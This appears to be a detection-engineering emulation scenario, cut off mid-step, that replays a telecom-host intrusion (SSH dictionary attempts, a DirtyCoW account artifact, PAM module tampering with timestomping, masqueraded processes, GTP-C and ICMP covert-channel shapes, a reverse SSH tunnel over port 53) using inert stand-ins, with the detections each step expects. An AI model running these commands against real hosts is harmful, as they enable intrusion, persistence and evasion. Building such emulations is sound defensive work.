# ── Causality contract ──────────────────────────────────────────────────────
# The report's entry is an interactive SSH session on the telecom host, so sshd is the
# CGO. step-01 (dictionary attempts) is the root; escalation (step-02), the PAM backdoor
# (step-03), the masqueraded tooling (step-04), the covert channels (step-05/06), the
# reverse tunnel (step-07) and the log scrub (step-10) continue one process chain. The
# NGFW threat records (step-08) and the rare-SSH record (step-09) are the network
# sessions of that chain. src_host is the shared entity every leg carries.
cgo_anchor:
  image_name: "sshd"
  primary_username: "root"

steps:
  - id: step-01
    name: "SSH dictionary attempts with default-account names against the lab host"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      mkdir -p "$LAB"
      for u in root admin operator support maint guest; do
        timeout 6 ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
          -o PreferredAuthentications=password,keyboard-interactive "$u@${STAGE_HOST:-127.0.0.1}" true >/dev/null 2>&1
        printf '%s ssh attempt user=%s rc=%s\n' "$(date -u +%FT%TZ)" "$u" "$?" >> "$LAB/ssh-dict.log"
      done
      cat "$LAB/ssh-dict.log"
    identity: root
    mitre_technique: "T1110.001"
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "One causality launches the ssh client six times against one destination with six different account names inside a minute — the report's dictionary attempts against telecom authentication services, keyed on the distinct-user fan-out to a single host."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-ssh-client-fan-out-across-default-accounts-to-one-host"

  - id: step-02
    name: "Privilege-escalation residue — DirtyCoW temp user firefart created then removed, PwnKit stand-in staged"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      mkdir -p "$LAB/priv"
      printf 'cortexsim-mp033 inert PwnKit stand-in (pslogs), not an ELF\n' > "$LAB/priv/pslogs"
      printf '# cortexsim-mp033 inert CVE-2021-3156 stand-in, no exploit code\n' > "$LAB/priv/exploit_userspec.py"
      sha256sum "$LAB/priv/pslogs" "$LAB/priv/exploit_userspec.py"
      echo 'report sha256 of PwnKit pslogs: 44e83f84a5d5219e2f7c3cf1e4f02489cae81361227f46946abe4b8d8245b879'
      if ! id firefart >/dev/null 2>&1; then useradd -r -N -M -s /usr/sbin/nologin -c 'cortexsim-mp033 DirtyCoW artifact stand-in' firefart; fi
      id firefart
      getent passwd firefart | grep -q cortexsim-mp033 && userdel firefart
      id firefart 2>&1 || true
    identity: root
    mitre_technique: "T1068"
    causality:
      parent_step: step-01
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "useradd creates, and userdel then removes, an account named firefart — the fixed username the public DirtyCoW (CVE-2016-5195) exploit writes into /etc/passwd, which the report saw created and later deleted. Keyed on the account name in the useradd/userdel command line or the /etc/passwd write. Lab side effects: useradd may also create a group entry and subordinate uid/gid ranges for the account; userdel removes them, and removal only runs when the GECOS field carries this scenario's cortexsim-mp033 tag."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-dirtycow-firefart-account-created-and-removed"

  - id: step-03
    name: "AuthDoor staging — a pam_unix.so written by cp, credential log /usr/bin/.dbus.log, timestomped"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      mkdir -p "$LAB/lib/security"
      SRC=$(find /lib /lib64 /usr/lib /usr/lib64 -name pam_unix.so 2>/dev/null | head -n 1)
      if [ -n "$SRC" ]; then cp "$SRC" "$LAB/lib/security/pam_unix.so"; else printf 'cortexsim-mp033 inert pam_unix.so stand-in\n' > "$LAB/lib/security/pam_unix.so"; fi
      [ -e /usr/bin/.dbus.log ] || { : > /usr/bin/.dbus.log; : > "$LAB/.dbus-log-created"; }
      : > "$LAB/a"
      REF=/usr/bin/time; [ -e "$REF" ] || REF=/bin/ls
      touch -r "$REF" "$LAB/lib/security/pam_unix.so"
      if [ -e "$LAB/.dbus-log-created" ]; then touch -r "$REF" /usr/bin/.dbus.log; fi
      sha256sum "$LAB/lib/security/pam_unix.so"
      echo 'report sha256 of AuthDoor pam_unix.so: 540f60702ee5019cd2b39b38b07e17da69bde1f9ed3b4543ff26e9da7ba6e0be'
      ls -l --time-style=full-iso "$LAB/lib/security/pam_unix.so" /usr/bin/.dbus.log
    identity: root
    mitre_technique: "T1556.003"
    causality:
      parent_step: step-02
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A file named pam_unix.so is written by a process that is not the package manager (cp from a shell causality), and the same causality creates the hidden file /usr/bin/.dbus.log and resets both timestamps with touch -r — the AuthDoor PAM-module replacement and its captured-credential log from the report."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-pam-unix-so-written-outside-the-package-manager"

  - id: step-04
    name: "Masqueraded tooling — dbus-* stand-ins dropped, a [kpqd] process kept alive by watchdogdd"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      mkdir -p "$LAB/bin"
      for n in dbusquery dbus-socks dbus-console httpdd evip-echo cupsd; do
        printf 'cortexsim-mp033 inert stand-in for %s, not an ELF\n' "$n" > "$LAB/bin/$n"
        chmod 0755 "$LAB/bin/$n"
      done
      cat > "$LAB/bin/watchdogdd" <<'SH'
      #!/bin/bash
      for i in 1 2; do
        pgrep -f '^\[kpqd\]' >/dev/null || ( exec -a '[kpqd]' sleep 25 ) &
        sleep 10
      done
      SH
      chmod 0755 "$LAB/bin/watchdogdd"
      "$LAB/bin/watchdogdd"
      ps -eo pid,ppid,user,args | grep -F '[kpqd]' | grep -v grep || true
      ls -l "$LAB/bin"
    identity: root
    mitre_technique: "T1036.005"
    causality:
      parent_step: step-03
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A user-space process whose command line is a bracketed kernel-thread name ([kpqd]) is started by a bash script (watchdogdd) rather than kthreadd, and the same causality writes executables named dbusquery, dbus-socks, dbus-console, httpdd, evip-echo and cupsd — the report's masquerade names and its 10-second watchdog."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-kernel-thread-named-process-restarted-by-a-watchdog-script"

  - id: step-05
    name: "GTPDoor shape — a dnsd_el5-named listener on UDP 2123 receives a GTPv1-C echo request"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      mkdir -p "$LAB/bin"
      cat > "$LAB/bin/gtpc-listen" <<'SH'
      #!/bin/bash
      exec -a dnsd_el5 python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind(("127.0.0.1", 2123)); s.settimeout(8); d, a = s.recvfrom(512); print("gtp-c datagram", len(d), "bytes from", a)'
      SH
      chmod 0755 "$LAB/bin/gtpc-listen"
      "$LAB/bin/gtpc-listen" &
      LISTENER=$!
      sleep 1
      python3 -c 'import socket, sys; d = bytes.fromhex("320100040000000000010000"); open(sys.argv[1], "wb").write(d); socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(d, ("127.0.0.1", 2123)); print("sent GTPv1-C echo request", len(d), "bytes")' "$LAB/gtpc-echo-request.bin"
      wait "$LISTENER" || true
      od -An -tx1 "$LAB/gtpc-echo-request.bin"
      echo 'report sha256 of GTPDoor dnsd_el5: 827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161'
    identity: root
    mitre_technique: "T1205"
    causality:
      parent_step: step-04
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: ABIOC
        description: "A process outside the host's learned telecom-core baseline (an interpreter renamed dnsd_el5) binds UDP 2123 — the GTP-C port GTPDoor listens on to hide C2 in GTP-C messages — and receives a datagram. Behavioural ABIOC on a rare listener of a telecom control-plane port, anchored on causality_actor_process_instance_id."
        ttp_ref: "TTP-2026-0192"
        detection_id: "abioc-mp-033-gtp-c-port-2123-listener-opened-by-a-non-core-process"

  - id: step-06
    name: "EchoBackdoor / NoDepDNS shape — 14-byte fixed-pattern ICMP echoes and the GTP-node DNS trigger"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      ping -c 3 -s 14 -p 66756e6e79416e644861707079 "${STAGE_HOST:-127.0.0.1}" > "$LAB/icmp.log" 2>&1 || true
      cat "$LAB/icmp.log"
      echo 'report sha256 of EchoBackdoor evip-echo: 188861d7f0861103886543eff63a96c314c8262dbf52c6e0cf9372cf1e889d52'
      if command -v dig >/dev/null 2>&1; then dig +short +time=2 +tries=1 pgw-s5s8.mpgw001.node @${LAB_RESOLVER:-127.0.0.53}; else echo 'dig not installed: GTP-node trigger query skipped'; fi
    identity: root
    mitre_technique: "T1095"
    causality:
      parent_step: step-04
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "The masquerade causality sends ICMP echo requests with a 14-byte payload filled with a fixed pattern (ping -s 14 -p), the EchoBackdoor chunk size, and resolves pgw-s5s8.mpgw001.node — the DNS question the report says triggers NoDepDNS. Keyed on the ping payload flags and the .node GTP-node query from one causality."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-fixed-pattern-icmp-echo-and-gtp-node-dns-trigger-from-one-causality"

  - id: step-07
    name: "sshtun shape — reverse SSH tunnel exposing local port 22 via remote port 53 on the lab host"
    command: |
      LAB=/var/tmp/.cortexsim-mp033
      timeout 8 ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ExitOnForwardFailure=yes -N -R 2222:127.0.0.1:22 -p 53 "tunnel@${STAGE_HOST:-127.0.0.1}" > "$LAB/sshtun.log" 2>&1
      RC=$?
      printf '%s reverse tunnel attempt rc=%s\n' "$(date -u +%FT%TZ)" "$RC" >> "$LAB/sshtun.log"
      cat "$LAB/sshtun.log"
      echo 'report sha256 of sshtun: 9e1f5a134d13167a9148f2d5a1e6a96136d22ecdfbc502aa974544e7efe16a22'
    identity: root
    mitre_technique: "T1572"
    causality:
      parent_step: step-04
      pivot: process_lineage
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "ssh is started with -N -R forwarding local port 22 and -p 53 — an SSH session to a remote DNS port carrying a reverse tunnel, the sshtun / autoreverse / dnsd pattern from the report. Keyed on the -R plus -p 53 command-line pair."
        ttp_ref: "TTP-2026-0192"
        detection_id: "bioc-mp-033-reverse-ssh-tunnel-to-remote-port-53"

  - id: step-08
    name: "NGFW leg — WildFire threat logs for five C2-delivered tools (report sha256s)"
    command: |
      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
      SRC_IP=$(hostname -I | awk '{print $1}')
      SRC_HOST=$(hostname -s)
      SRC_USER=$(id -un)
